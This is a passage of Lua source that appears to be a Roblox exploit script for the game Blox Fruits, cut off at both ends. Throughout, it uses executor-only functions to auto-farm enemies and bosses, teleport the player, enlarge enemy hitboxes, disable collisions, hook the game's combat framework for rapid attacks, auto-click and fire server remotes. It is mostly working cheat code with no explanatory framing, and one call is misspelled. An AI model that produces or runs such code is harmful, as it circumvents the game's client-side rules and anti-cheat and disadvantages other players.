                                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Workspace.Map.Desert.Cup.CFrame
                                    end
                                    
                                
                                end
                            end
                        else
                            if game.Players.LocalPlayer.Backpack:FindFirstChild("Torch") or game.Players.LocalPlayer.Character:FindFirstChild("Torch") then
                                EquipTool("Torch")
                                Questtween = toX2(CFrame.new(1114.87708, 4.9214654, 4349.8501).Position,CFrame.new(1114.87708, 4.9214654, 4349.8501))
                                if (CFrame.new(1114.87708, 4.9214654, 4349.8501).Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).magnitude <= 300 then
                                    if Questtween then
                                        Questtween:Stop()
                                    end
                                    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(1114.87708, 4.9214654, 4349.8501, -0.612586915, -9.68697833e-08, 0.790403247, -1.2634203e-07, 1, 2.4638446e-08, -0.790403247, -8.47679615e-08, -0.612586915)
                                end
                            else
                                Questtween = toX2(CFrame.new(-1610.00757, 11.5049858, 164.001587).Position,CFrame.new(-1610.00757, 11.5049858, 164.001587))
                                if (CFrame.new(-1610.00757, 11.5049858, 164.001587).Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).magnitude <= 300 then
                                    if Questtween then
                                        Questtween:Stop()
                                    end
                                    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-1610.00757, 11.5049858, 164.001587, 0.984807551, -0.167722285, -0.0449818149, 0.17364943, 0.951244235, 0.254912198, 3.42372805e-05, -0.258850515, 0.965917408)
                                end
                            end
                        end
                    else
                        for i,v in pairs(Workspace.Map.Jungle.QuestPlates:GetChildren()) do
                            if v:IsA("Model") then wait()
                                if v.Button.BrickColor ~= BrickColor.new("Camo") then
                                    repeat wait()
                                        Questtween = toX2(v.Button.Position,v.Button.CFrame)
                                        if (v.Button.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).magnitude <= 150 then
                                            if Questtween then
                                                Questtween:Stop()
                                            end
                                            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = v.Button.CFrame
                                        end
                                    until not _G.Auto_Saber or v.Button.BrickColor == BrickColor.new("Camo")
                                end
                            end
                        end    
                    end
                end
            end 
        end
    end
end)
spawn(function()
    while wait() do
        if _G.Auto_SharkMan_Karate then
            if game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("Fishman Karate") or game:GetService("Players").LocalPlayer.Character:FindFirstChild("Fishman Karate") or game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("Sharkman Karate") or game:GetService("Players").LocalPlayer.Character:FindFirstChild("Sharkman Karate") then
                if game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("Fishman Karate") and game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("Fishman Karate").Level.Value >= 400 then
                    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuySharkmanKarate")
                    _G.ConfigTestDropdownNormal = "Sharkman Karate"
                end  
                if game:GetService("Players").LocalPlayer.Character:FindFirstChild("Fishman Karate") and game:GetService("Players").LocalPlayer.Character:FindFirstChild("Fishman Karate").Level.Value >= 400 then
                    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuySharkmanKarate")
                    _G.ConfigTestDropdownNormal = "Sharkman Karate"
                end  
                if game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("Fishman Karate") and game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("Fishman Karate").Level.Value <= 400 then
                    _G.ConfigTestDropdownNormal = "Fishman Karate"
                end 
            else 
                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyFishmanKarate")
            end
        end
    end
end)
spawn(function()
    while wait() do
        if _G.Auto_Death_Step then
            if game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("Black Leg") or game:GetService("Players").LocalPlayer.Character:FindFirstChild("Black Leg") or game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("Death Step") or game:GetService("Players").LocalPlayer.Character:FindFirstChild("Death Step") then
                if game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("Black Leg") and game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("Black Leg").Level.Value >= 450 then
                    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyDeathStep")
                    _G.ConfigTestDropdownNormal = "Death Step"
                end  
                if game:GetService("Players").LocalPlayer.Character:FindFirstChild("Black Leg") and game:GetService("Players").LocalPlayer.Character:FindFirstChild("Black Leg").Level.Value >= 450 then
                    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyDeathStep")
                    _G.ConfigTestDropdownNormal = "Death Step"
                end  
                if game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("Black Leg") and game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("Black Leg").Level.Value <= 449 then
                    _G.ConfigTestDropdownNormal = "Black Leg"
                end 
            else 
                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyBlackLeg")
            end
        end
    end
end)
spawn(function()
    while wait() do
        if _G.Auto_Fully_Death_Step then
            pcall(function()
                if not game.Players.LocalPlayer.Backpack:FindFirstChild("Black Leg") or not game.Players.LocalPlayer.Character:FindFirstChild("Black Leg") or not game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("Death Step") or not game:GetService("Players").LocalPlayer.Character:FindFirstChild("Death Step") then
                    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyBlackLeg")
                end				
                if game:GetService("Workspace").Map.IceCastle.Hall.LibraryDoor.PhoeyuDoor.Transparency == 0 then  
                    if game:GetService("Players").LocalPlayer.Character:FindFirstChild("Library Key") or game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("Library Key") then
                        EquipTool("Library Key")
                        repeat wait() getgenv().ToPos(CFrame.new(6371.2001953125, 296.63433837890625, -6841.18115234375)) until (CFrame.new(6371.2001953125, 296.63433837890625, -6841.18115234375).Position - game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <= 3 or not _G.Auto_Fully_Death_Step
                        if (CFrame.new(6371.2001953125, 296.63433837890625, -6841.18115234375).Position - game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <= 3 then
                            wait(1.2)
                            game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyDeathStep",true)
                            game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyDeathStep")
                            wait(0.5)
                        end
                    elseif game.Players.LocalPlayer.Backpack:FindFirstChild("Black Leg") and game.Players.LocalPlayer.Backpack:FindFirstChild("Black Leg").Level.Value >= 450 or game.Players.LocalPlayer.Character:FindFirstChild("Black Leg") and game.Players.LocalPlayer.Character:FindFirstChild("Black Leg").Level.Value >= 450 then   
                        if game:GetService("ReplicatedStorage"):FindFirstChild("Awakened Ice Admiral4") or game:GetService("Workspace").Enemies:FindFirstChild("Awakened Ice Admiral4") then
                            if game:GetService("Workspace").Enemies:FindFirstChild("Awakened Ice Admiral4") then 	
                                for i,v in pairs(game:GetService("Workspace").Enemies:GetChildren()) do
                                    if v.Name == "Awakened Ice Admiral4" then    
                                        repeat wait()
                                            EquipTool(_G.ConfigTestDropdownNormal)
                                            v.Head.CanCollide = false
                                            v.Humanoid.WalkSpeed = 0
                                            v.HumanoidRootPart.CanCollide = false
                                            v.HumanoidRootPart.Size = Vector3.new(50,50,50)
                                            getgenv().ToPos(v.HumanoidRootPart.CFrame * CFrame.new(0,40,0))
                                            game:GetService'VirtualUser':CaptureController()
                                            game:GetService'VirtualUser':Button1Down(Vector2.new(1280, 672))
                                            sethiddenproperty(game:GetService("Players").LocalPlayer,"SimulationRadius",math.huge)
                                        until not v.Parent or v.Humanoid.Health <= 0 or _G.Auto_Fully_Death_Step == false or game:GetService("Players").LocalPlayer.Character:FindFirstChild("Library Key") or game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("Library Key")
                                    end
                                end
                            else
                                repeat wait() getgenv().ToPos(game:GetService("ReplicatedStorage"):FindFirstChild("Awakened Ice Admiral4").HumanoidRootPart.CFrame) until game:GetService("Workspace").Enemies:FindFirstChild("Awakened Ice Admiral4")
                            end
                        else 
                            Hop()
                        end
                    end
                else 
                    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyDeathStep")
                end
            end)
        end
    end
end)
spawn(function()
    while wait() do 
        if _G.Auto_Electric_Claw then
            if game.Players.LocalPlayer.Backpack:FindFirstChild("Electro") or game.Players.LocalPlayer.Character:FindFirstChild("Electro") or game.Players.LocalPlayer.Backpack:FindFirstChild("Electric Claw") or game.Players.LocalPlayer.Character:FindFirstChild("Electric Claw") then
                if game.Players.LocalPlayer.Backpack:FindFirstChild("Electro") and game.Players.LocalPlayer.Backpack:FindFirstChild("Electro").Level.Value >= 400 then
                    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyElectricClaw")
                    _G.ConfigTestDropdownNormal = "Electric Claw"
                end  
                if game.Players.LocalPlayer.Character:FindFirstChild("Electro") and game.Players.LocalPlayer.Character:FindFirstChild("Electro").Level.Value >= 400 then
                    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyElectricClaw")
                    _G.ConfigTestDropdownNormal = "Electric Claw"
                end  
                if game.Players.LocalPlayer.Backpack:FindFirstChild("Electro") and game.Players.LocalPlayer.Backpack:FindFirstChild("Electro").Level.Value <= 399 then
                    _G.ConfigTestDropdownNormal = "Electro"
                end 
            else
                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyElectro")
            end
        end
    end
end)
spawn(function()
    while wait() do
        if _G.Auto_Fully_SharkMan_Karate then
            pcall(function()
                if not game.Players.LocalPlayer.Backpack:FindFirstChild("Fishman Karate") or not game.Players.LocalPlayer.Character:FindFirstChild("Fishman Karate") then
                    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyFishmanKarate")
                end		
                if string.find(game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuySharkmanKarate"), "keys") then  
                    if game:GetService("Players").LocalPlayer.Character:FindFirstChild("Water Key") or game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("Water Key") then
                        repeat wait() getgenv().ToPos(-2604.6958, 239.432526, -10315.1982, 0.0425701365, 0, -0.999093413, 0, 1, 0, 0.999093413, 0, 0.0425701365) until (CFrame.new(-2604.6958, 239.432526, -10315.1982, 0.0425701365, 0, -0.999093413, 0, 1, 0, 0.999093413, 0, 0.0425701365).Position - game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <= 3 or not _G.Auto_Fully_SharkMan_Karate
                        if (CFrame.new(-2604.6958, 239.432526, -10315.1982, 0.0425701365, 0, -0.999093413, 0, 1, 0, 0.999093413, 0, 0.0425701365).Position - game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <= 3 then
                            wait(1.2)
                            game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuySharkmanKarate",true)
                            game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuySharkmanKarate")
                            wait(0.5)
                        end
                    elseif game.Players.LocalPlayer.Backpack:FindFirstChild("Fishman Karate") and game.Players.LocalPlayer.Backpack:FindFirstChild("Fishman Karate").Level.Value >= 400 or game.Players.LocalPlayer.Backpack:FindFirstChild("Fishman Karate") and game.Players.LocalPlayer.Backpack:FindFirstChild("Fishman Karate").Level.Value >= 400 then   
                        if game:GetService("ReplicatedStorage"):FindFirstChild("Tide Keeper4") or game:GetService("Workspace").Enemies:FindFirstChild("Tide Keeper4") then
                            if game:GetService("Workspace").Enemies:FindFirstChild("Tide Keeper4") then 	
                                for i,v in pairs(game:GetService("Workspace").Enemies:GetChildren()) do
                                    if v.Name == "Tide Keeper4" then    
                                        repeat wait()
                                            EquipTool(_G.ConfigTestDropdownNormal)
                                            v.Head.CanCollide = false
                                            v.Humanoid.WalkSpeed = 0
                                            v.HumanoidRootPart.CanCollide = false
                                            v.HumanoidRootPart.Size = Vector3.new(50,50,50)
                                            getgenv().ToPos(v.HumanoidRootPart.CFrame * CFrame.new(0,_G.Select_Distance,0))
                                            game:GetService'VirtualUser':CaptureController()
                                            game:GetService'VirtualUser':Button1Down(Vector2.new(1280, 672))
                                            sethiddenproperty(game:GetService("Players").LocalPlayer,"SimulationRadius",math.huge)
                                        until not v.Parent or v.Humanoid.Health <= 0 or _G.Auto_Fully_SharkMan_Karate == false or game:GetService("Players").LocalPlayer.Character:FindFirstChild("Water Key") or game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("Water Key")
                                    end
                                end
                            else
                                repeat wait() getgenv().ToPos(game:GetService("ReplicatedStorage"):FindFirstChild("Tide Keeper4").HumanoidRootPart.CFrame) until game:GetService("Workspace").Enemies:FindFirstChild("Tide Keeper4")
                            end
                        else
                            Hop()
                        end
                    end
                else 
                    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuySharkmanKarate")
                end
            end)
        end
    end
end)
spawn(function()
    while wait() do
        if _G.Auto_Third_World then
            pcall(function()
                if game:GetService("Players").LocalPlayer.Data.Level.Value >= 1500 and game.PlaceId == 2753915549 then
                    _G.AutoFarmL = false
                    if game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("ZQuestProgress","Check") == 0 then
                        getgenv().ToPos(CFrame.new(-1926.3221435547, 12.819851875305, 1738.3092041016))
                        if (CFrame.new(-1926.3221435547, 12.819851875305, 1738.3092041016).Position - game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <= 10 then
                            wait(1.5)
                            game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("ZQuestProgress","Begin")
                        end
                        wait(1.8)
                        if game:GetService("Workspace").Enemies:FindFirstChild("rip_indra5") then
                            for i,v in pairs(game:GetService("Workspace").Enemies:GetChildren()) do
                                if v.Name == "rip_indra5" then
                                    OldCFrameThird = v.HumanoidRootPart.CFrame
                                    repeat wait()
                                        EquipTool(_G.ConfigTestDropdownNormal)
                                        v.HumanoidRootPart.CFrame = OldCFrameThird
                                        v.HumanoidRootPart.Size = Vector3.new(50,50,50)
                                        v.HumanoidRootPart.CanCollide = false
                                        v.Humanoid.WalkSpeed = 0
                                        getgenv().ToPos(v.HumanoidRootPart.CFrame * CFrame.new(0,40,0))
                                        game:GetService'VirtualUser':CaptureController()
                                        game:GetService'VirtualUser':Button1Down(Vector2.new(1280, 672))
                                        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("TravelZou")
                                        sethiddenproperty(game:GetService("Players").LocalPlayer,"SimulationRadius",math.huge)
                                    until _G.Auto_Third_World == false or v.Humanoid.Health <= 0 or not v.Parent
                                end
                            end
                        elseif not game:GetService("Workspace").Enemies:FindFirstChild("rip_indra5") and (CFrame.new(-26880.93359375, 22.848554611206, 473.18951416016).Position - game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <= 1000 then
                            getgenv().ToPos(CFrame.new(-26880.93359375, 22.848554611206, 473.18951416016))
                        end
                    end
                end
            end)
        end
    end
end)
if _G.Farm_Mode == nil then _G.Farm_Mode = "Normal" end
_G.Auto_Farm = true
wait()
_G.Auto_Farm = false
repeat wait() until game.Players
repeat wait() until game.Players.LocalPlayer
repeat wait() until game.ReplicatedStorage
repeat wait() until game.ReplicatedStorage:FindFirstChild("Remotes");
repeat wait() until game.Players.LocalPlayer:FindFirstChild("PlayerGui");
repeat wait() until game.Players.LocalPlayer.PlayerGui:FindFirstChild("Main");
repeat wait() until game:GetService("Players")
repeat wait() until game:GetService("Players").LocalPlayer.Character:FindFirstChild("Energy")
wait(.3)
if not game:IsLoaded() then repeat game.Loaded:Wait() until game:IsLoaded() end
if game:GetService("Players").LocalPlayer.PlayerGui.Main:FindFirstChild("ChooseTeam") then
    repeat wait()
        if game:GetService("Players").LocalPlayer.PlayerGui:WaitForChild("Main").ChooseTeam.Visible == true then
            if _G.Teams == "Pirates" then
                for i, v in pairs(getconnections(game:GetService("Players").LocalPlayer.PlayerGui.Main.ChooseTeam.Container.Pirates.Frame.ViewportFrame.TextButton.Activated)) do                                                                                                
                    v.Function()
                end
            elseif _G.Teams == "Marines" then
                for i, v in pairs(getconnections(game:GetService("Players").LocalPlayer.PlayerGui.Main.ChooseTeam.Container.Marines.Frame.ViewportFrame.TextButton.Activated)) do                                                                                                
                    v.Function()
                end
            else
                print("Worng Teams")
            end
        end
    until game.Players.LocalPlayer.Team ~= nil and game:IsLoaded()
end
spawn(function()
    game:GetService("RunService").Heartbeat:Connect(function()
        pcall(function()
            for i,v in pairs(game:GetService("Workspace").Enemies:GetChildren()) do
                if _G.Auto_Farm_Bone and StartMagnetBoneMon and (v.Name == "Reborn Skeleton9" or v.Name == "Living Zombie0" or v.Name == "Demonic Soul" or v.Name == "Posessed Mummy") and (v.HumanoidRootPart.Position - PosMonBone.Position).magnitude <= 350 then
                    v.HumanoidRootPart.CFrame = PosMonBone
                    v.HumanoidRootPart.CanCollide = false
                    v.HumanoidRootPart.Size = Vector3.new(50,50,50)
                    if v.Humanoid:FindFirstChild("Animator") then
                        v.Humanoid.Animator:Destroy()
                    end
                    sethiddenproperty(game.Players.LocalPlayer, "SimulationRadius",  math.huge)
                end
            end
        end)
    end)
end)
spawn(function()
    while wait() do
        if _G.Auto_Farm_Bone then
            pcall(function()
                if game:GetService("Workspace").Enemies:FindFirstChild("Reborn Skeleton9") or game:GetService("Workspace").Enemies:FindFirstChild("Living Zombie0") or game:GetService("Workspace").Enemies:FindFirstChild("Domenic Soul") or game:GetService("Workspace").Enemies:FindFirstChild("Posessed Mummy") then
                    for i,v in pairs(game:GetService("Workspace").Enemies:GetChildren()) do
                        if v.Name == "Reborn Skeleton9" or v.Name == "Living Zombie0" or v.Name == "Demonic Soul" or v.Name == "Posessed Mummy" then
                            if v.Humanoid.Health > 0 then
                                repeat wait()
                                    StartMagnetBoneMon = true
                                    v.HumanoidRootPart.CanCollide = false
                                    v.HumanoidRootPart.Size = Vector3.new(60, 60, 60)
                                    PosMonBone = v.HumanoidRootPart.CFrame
                                    getgenv().ToPos(v.HumanoidRootPart.CFrame * CFrame.new(0,40,0))
                                    game:GetService'VirtualUser':CaptureController()
                                    game:GetService'VirtualUser':Button1Down(Vector2.new(1280, 672))
                                until _G.Auto_Farm_Bone == false or not v.Parent or v.Humanoid.Health <= 0
                            end
                        end
                    end
                else
                    StartMagnetBoneMon = false
                    for i,v in pairs(game:GetService("ReplicatedStorage"):GetChildren()) do 
                        if v.Name == "Reborn Skeleton9" then
                            getgenv().ToPos(v.HumanoidRootPart.CFrame * CFrame.new(0,40,0))
                        elseif v.Name == "Living Zombie0" then
                            getgenv().ToPos(v.HumanoidRootPart.CFrame * CFrame.new(0,40,0))
                        elseif v.Name == "Demonic Soul" then
                            getgenv().ToPos(v.HumanoidRootPart.CFrame * CFrame.new(0,40,0))
                        elseif v.Name == "Posessed Mummy" then
                            getgenv().ToPos(v.HumanoidRootPart.CFrame * CFrame.new(0,40,0))
                        end
                    end
                    getgenv().ToPos(CFrame.new(-9515.1181640625, 163.98355102539062, 5787.2041015625))
                end
            end)
        end
    end
end)

spawn(function()
    pcall(function()
        while wait() do
            for i, v in pairs(game:GetService("Players").LocalPlayer.Backpack:GetChildren()) do
                if v.ToolTip == tostring(_G.Weapon) then
                    game.Players.LocalPlayer.Character.Humanoid:EquipTool(v)
                end
            end
        end
    end)
end)
spawn(function()
    while wait() do
        if _G.DecreaseMoney then
            pcall(function()
                local args = {
                    [1] = "BuyBoat",
                    [2] = "PirateBasic"
                }
                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer(unpack(args))
            end)
        end
    end
end)
local Module = require(game.Players.LocalPlayer.PlayerScripts.CombatFramework)
local CombatFramework = debug.getupvalues(Module)[2]
local CamShake = require(game.ReplicatedStorage.Util.CameraShaker)
spawn(function()
while task.wait() do
    if _G.Fast_Farm or _G.AutoFarmL or _G.NChest or _G.AFdf or _G.Auto_Cake_Prince or _G.Auto_Elite_Hunter or _G.Auto_Farm_Bone  or _G.AutoFarmBone or _G.AuToFarmMasFruits or _G.Sea2 or _G.Auto_Rengoku or _G.Auto_Next_Island or _G.Auto_Farm_Boss or _G.Auto_Saber then
    pcall(function()
        CamShake:Stop()
        CombatFramework.activeController.hitSound = 0
        CombatFramework.activeController.attacking = false
        CombatFramework.activeController.timeToNextAttack = 0
        CombatFramework.activeController.increment = 3
        CombatFramework.activeController.hitboxMagnitude = 1000
        CombatFramework.activeController.blocking = false
        CombatFramework.activeController.timeToNextBlock = 0
        CombatFramework.activeController.focusStart = 0
    end)
    end
    task.wait()
end
end)
spawn(function()
    while task.wait() do
        pcall(function()
            if _G.Fast_Farm or _G.AutoFarmL or _G.NChest or _G.SaveModeSS or _G.AFdf or _G.Auto_Cake_Prince or _G.Auto_Elite_Hunter or _G.Auto_Farm_Bone or _G.Auto_Farm_All_Boss or _G.AutoFarmBone or _G.Auto_Third_World or _G.AuToFarmMasFruits or _G.Sea2 or _G.Start_Tween_Island or _G.Auto_Rengoku or _G.Auto_Next_Island or _G.Auto_Farm_Boss or _G.Auto_Saber or _G.Auto_Fully_SharkMan_Karate then
                if not game:GetService("Players").LocalPlayer.Character.HumanoidRootPart:FindFirstChild("BodyClip") then
                    local Noclip = Instance.new("BodyVelocity")
                    Noclip.Name = "BodyClip"
                    Noclip.Parent = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart
                    Noclip.MaxForce = Vector3.new(100000,100000,100000)
                    Noclip.Velocity = Vector3.new(0,0,0)
                end
            else
                game:GetService("Players").LocalPlayer.Character.HumanoidRootPart:FindFirstChild("BodyClip"):Destroy()
            end
        end)
    end
end)
spawn(function()
    pcall(function()
        game:GetService("RunService").Stepped:Connect(function()
            if _G.Fast_Farm or _G.AutoFarmL or _G.NChest or _G.SaveModeSS or _G.LOf or _G.AFdf or _G.Auto_Cake_Prince or _G.Auto_Elite_Hunter or _G.Auto_Farm_Bone  or _G.Auto_Farm_All_Boss or _G.AutoFarmBone or _G.AuToFarmMasFruits or _G.Sea2 or _G.Start_Tween_Island or _G.Auto_Rengoku or _G.NoClip or _G.Auto_Farm_Boss or _G.Auto_Saber then
                for _, v in pairs(game.Players.LocalPlayer.Character:GetDescendants()) do
                    if v:IsA("BasePart") then
                        v.CanCollide = false    
                    end
                end
            end
        end)
    end)
end)
spawn(function()
    pcall(function()
        while wait() do
            if _G.AutoFarmL or _G.Auto_Cake_Prince or _G.Auto_Elite_Hunter or _G.Auto_Farm_Bone  or _G.AutoFarmBone or _G.AuToFarmMasFruits or _G.Sea2 or _G.Auto_Rengoku or _G.Auto_Farm_Boss or _G.Auto_Saber or _G.NonEffect then
                game:GetService("ReplicatedStorage").Effect.Container.Death:Destroy()
            end
        end
    end)
end)
spawn(function()
    game:GetService("RunService").Heartbeat:Connect(function()
        if game:GetService("Players").LocalPlayer.Character:FindFirstChild("Humanoid") and _G.Auto_Next_Island or _G.Start_Tween_Island then
            setfflag("HumanoidParallelRemoveNoPhysics", "False")
            setfflag("HumanoidParallelRemoveNoPhysicsNoSimulate2", "False")
            game:GetService("Players").LocalPlayer.Character.Humanoid:ChangeState(11)
        end
    end)
end)
spawn(function()
    pcall(function()
        while wait() do
            if _G.TPMirage and game:GetService("Workspace").Map:FindFirstChild("MysticIsland") then
                _G.CenterMI = game:GetService("Workspace").Map.MysticIsland.Center.CFrame * CFrame.new(0,300,0)
                getgenv().ToPos(CFrame.new(_G.CenterMI))
            end
        end
    end)
end)
function tween_cancel()
    totarget(game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame)
end 
if _G.Fast_Attack_Mode == nil then
    _G.Fast_Attack_Mode = "Fast"
end
local a=debug.getupvalues(require(game:GetService("Players").LocalPlayer.PlayerScripts:WaitForChild("CombatFramework")))[2]local b=game:GetService("VirtualUser")local c=debug.getupvalues(require(game:GetService("Players").LocalPlayer.PlayerScripts.CombatFramework.RigController))[2]local d=game:GetService("Players").LocalPlayer;local e=require(d.PlayerScripts.CombatFramework.Particle.Damage)local f=require(game.ReplicatedStorage.Util.CameraShaker)f:Stop()function CurveFuckWeapon()local g=a.activeController;local h=g.blades[1]if not h then return end;while h.Parent~=game.Players.LocalPlayer.Character do h=h.Parent end;return h end;function getHits(i)local j={}local l=workspace.Enemies:GetChildren()local m=workspace.Characters:GetChildren()for n=1,#l do local o=l[n]local p=o:FindFirstChildOfClass("Humanoid")if p and p.RootPart and p.Health>0 and game.Players.LocalPlayer:DistanceFromCharacter(p.RootPart.Position)<i+5 then table.insert(j,p.RootPart)end end;for n=1,#m do local o=m[n]if o~=game.Players.LocalPlayer.Character then local p=o:FindFirstChildOfClass("Humanoid")if p and p.RootPart and p.Health>0 and game.Players.LocalPlayer:DistanceFromCharacter(p.RootPart.Position)<i+5 then table.insert(j,p.RootPart)end end end;return j end;function Boost()task.spawn(function()game:GetService("ReplicatedStorage").RigControllerEvent:FireServer("weaponChange",tostring(CurveFuckWeapon()))end)end;function Unboost()tsak.spawn(function()game:GetService("ReplicatedStorage").RigControllerEvent:FireServer("unequipWeapon",tostring(CurveFuckWeapon()))end)end;local q=0;local r=Instance.new("Animation")local s=0;FastAttacksss=function()local t=a.activeController;if t and t.equipped then task.spawn(function()if tick()-q>0.5 then t:attack()q=tick()else r.AnimationId=t.anims.basic[2]t.humanoid:LoadAnimation(r):Play(1,1)game:GetService("ReplicatedStorage").RigControllerEvent:FireServer("hit",getHits(120),2,"")end end)end end;bs=tick()task.spawn(function()while task.wait(_G.Fast_DelayOPP)do if _G.FastAttackOPP then _G.FastOPP=true;if bs-tick()>0.75 then task.wait()bs=tick()end;pcall(function()for n,o in pairs(game.Workspace.Enemies:GetChildren())do if o.Humanoid.Health>0 then if(o.HumanoidRootPart.Position-game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude<=100 then FastAttacksss()task.wait()Boost()end end end end)end end end)k=tick()task.spawn(function()if _G.FastOPP then while task.wait(.2)do if k-tick()>0.75 then task.wait()k=tick()end end;pcall(function()for n,o in pairs(game.Workspace.Enemies:GetChildren())do if o.Humanoid.Health>0 then if(o.HumanoidRootPart.Position-game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude<=100 then task.wait(.000025)Unboost()end end end end)end end)task.spawn(function()while task.wait()do if _G.FastOPP then pcall(function()a.activeController.timeToNextAttack=-1;a.activeController.focusStart=0;a.activeController.hitboxMagnitude=40;a.activeController.humanoid.AutoRotate=true;a.activeController.increment=1+1/1 end)end end end)abc=true;task.spawn(function()local u=game.Players.LocalPlayer;local v=require(u.PlayerScripts.CombatFramework.Particle)local w=require(game:GetService("ReplicatedStorage").CombatFramework.RigLib)if not shared.orl then shared.orl=w.wrapAttackAnimationAsync end;if not shared.cpc then shared.cpc=v.play end;if abc then pcall(function()w.wrapAttackAnimationAsync=function(x,y,z,A,B)local n=w.getBladeHits(y,z,A)if n then v.play=function()end;x:Play(0.25,0.25,0.25)B(n)v.play=shared.cpc;wait(.5)x:Stop()end end end)end end)

    spawn(function()
            game:GetService("RunService").RenderStepped:Connect(function()
                pcall(function()
                    if _G.Auto_Farm then
                        CheckLevel()
        if game:GetService("Players").LocalPlayer.PlayerGui.Main.Quest.Visible == false then    
            local args = {
                [1] = "StartQuest",
                [2] = QN,
                [3] = QC
            }
            
            game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer(unpack(args))
        elseif game:GetService("Workspace").Enemies:FindFirstChild(Mon) then
                totarget(game:GetService("Workspace").Enemies[Mon].HumanoidRootPart.CFrame * CFrame.new(0,45,0))
            local CombatFramework = require(game:GetService("Players").LocalPlayer.PlayerScripts.CombatFramework)
            local Camera = require(game.ReplicatedStorage.Util.CameraShaker)
            Camera:Stop()
            getupvalues(CombatFramework)[2].activeController.hitboxMagnitude = 80
getupvalues(CombatFramework)[2]['activeController']:attack()    
    end
                end
                end)
            end)
            end)
            
            function bypass(x)
                if game.Players.LocalPlayer.Character.Humanoid.Health >= 1 then
                    wait(.1)
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = x
wait(.1)
game.Players.LocalPlayer.Character.Humanoid:ChangeState(15)
end
            end
            
            spawn(function()
            while wait(1) do
                pcall(function()
                    if _G.Semi_Tp then
                    CheckLevel()
                    local Distance2 = (CMON.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude
                    if Distance2 >= 3000 then
bypass(CMON)
                    end
                end
                end)
            end
            end)
            
            spawn(function()
            while wait(1) do
                pcall(function()
                    if _G.AUTO_EQUIP or _G.Auto_Dragon_Trident or _G.Auto_Elite_Hunter or _G.Auto_SeaBeast or _G.Auto_Bounty_MinkV4 or _G.Auto_Farm or _G.Fast_Farm or _G.Auto_Mastery or _G.AUTOBONE or _G.Auto_Material or _G.CAKEPRINCE or _G.CAKEPRINCE2 or _G.Auto_Hearts or _G.Auto_Boss or _G.auto_new_world or _G.Auto_Hallow_Scythe or _G.Auto_Rengoku then
                        for i,v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
                        if v.ToolTip == _G.SelectWeapon then
                        game.Players.LocalPlayer.Character.Humanoid:EquipTool(game:GetService("Players").LocalPlayer.Backpack:FindFirstChild(v.Name))
                        end
                        end
                end
                end)
            end
            end)
            
            spawn(function()
            game:GetService("RunService").RenderStepped:Connect(function()
                pcall(function()
                    if _G.Auto_Farm then
                        CheckLevel()
                        if not game:GetService("Workspace").Enemies:FindFirstChild(Mon) then
            totarget(CMON)
            end
            end
            end)
            end)
            end)
            
            spawn(function()
            while wait(.2) do
                pcall(function()
                    if _G.Auto_Farm then
                        CheckLevel()
                        if not string.find(game.Players.LocalPlayer.PlayerGui.Main.Quest.Container.QuestTitle.Title.Text, TITLE) then
        local args = {
            [1] = "AbandonQuest"
        }
